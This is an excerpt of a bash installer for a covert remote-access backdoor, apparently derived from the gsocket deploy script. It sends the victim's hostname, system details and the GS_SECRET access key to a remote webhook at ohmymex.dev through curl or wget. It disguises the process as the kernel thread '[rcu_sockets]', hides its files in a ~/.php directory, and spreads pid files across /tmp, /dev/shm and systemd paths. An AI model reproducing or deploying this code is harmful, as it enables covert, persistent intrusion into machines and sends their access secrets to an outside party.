...
### ohmymex.dev
# BARBER="dc3c1af9-ea3d-4401-9158-eb6dda735276"
[[ -n $BARBER ]] && {
    data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "${GS_SECRET}"}'
    GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-H' "X-API-Key: ${BARBER}" '-d' "${data}" "https://ohmymex.dev/ohmygusionhook/")
    GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--header=X-API-Key: ${BARBER}" "--post-data=${data}" "https://ohmymex.dev/ohmygusionhook/")
}
### discord webhook
...
BIN_HIDDEN_NAME_DEFAULT="[rcu_sockets]"
...
init_dstbin()
{
	...
	[[ ! -d "${GS_PREFIX}${HOME}/.php" ]] && xmkdir "${GS_PREFIX}${HOME}/.php"
	try_dstdir "${GS_PREFIX}${HOME}/.php/${CONFIG_DIR_NAME}" && return
...
uninstall()
{
	...
	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
			uninstall_rm "${GS_PREFIX}${HOME}/.php/${cn}/${hn}"
			uninstall_rm "${GS_PREFIX}${HOME}/.php/${cn}/${hn}.pid"  # SEC_NAME
		done
		...
		uninstall_rm "${RCLOCAL_DIR}/${hn}.pid"  # SEC_NAME
		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.pid" # SEC_NAME

		uninstall_rm "/dev/shm/${hn}.pid" # SEC_NAME
		uninstall_rm "/tmp/.gsusr-${UID}${hn}.pid" # SEC_NAME

		uninstall_rm "${PWD}/${hn}.pid" # SEC_NAME
		...
		## Systemd's gs-dbus.pid
		uninstall_rm "${SERVICE_DIR}/${hn}.pid"  # SYSTEMD_SEC_FILE / SEC_NAME
	done

	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
		uninstall_rmdir "${GS_PREFIX}${HOME}/.php/${cn}"
	done
	uninstall_rmdir "${GS_PREFIX}${HOME}/.php"
...
gs_start()
{
	...
	if [[ -n "$IS_OLD_RUNNING" ]]; then
		...
		if [[ -n "$IS_SKIPPED" ]]; then
			# HERE: Already running. Skipped installation (sec.pid has not changed).
			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
			unset IS_NEED_START
		else
			# HERE: sec.pid has been updated
			OK_OUT
